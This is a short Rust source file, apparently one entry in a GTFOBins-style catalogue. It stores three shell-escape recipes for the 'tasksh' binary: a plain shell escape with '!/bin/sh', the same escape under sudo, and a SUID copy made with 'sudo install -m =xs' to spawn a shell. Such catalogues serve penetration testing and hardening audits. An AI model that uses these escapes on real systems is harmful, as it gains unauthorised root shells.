pub static BIN_NAME: &'static str = "tasksh";
pub static SH_CODE: &'static str = r#"
    
    tasksh
    !/bin/sh
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo tasksh
    !/bin/sh
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which tasksh) .

    ./tasksh
    !/bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
